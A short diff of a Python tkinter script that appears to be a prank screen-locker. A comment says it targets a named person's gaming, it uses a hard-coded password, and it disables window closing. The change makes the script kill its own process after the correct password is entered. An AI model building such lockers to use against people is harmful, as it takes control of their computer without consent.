@@ -2,11 +2,14 @@
 # By: Huy2007Chuck
 # For destroying Oscar's dream to become the best Dungeon Quest player
 
+import os
 import subprocess
+import sys
 import time
 import tkinter as tk
 
 password = "huy"
+print(os.getpid())
 
 
 def disable_event():
@@ -38,7 +41,7 @@ def check_pass2(event):
     p = e.get()
     if p == password:
         root.destroy()
-        quit()
+        os.kill(os.getpid(), 9)
 
 
 root = tk.Tk()
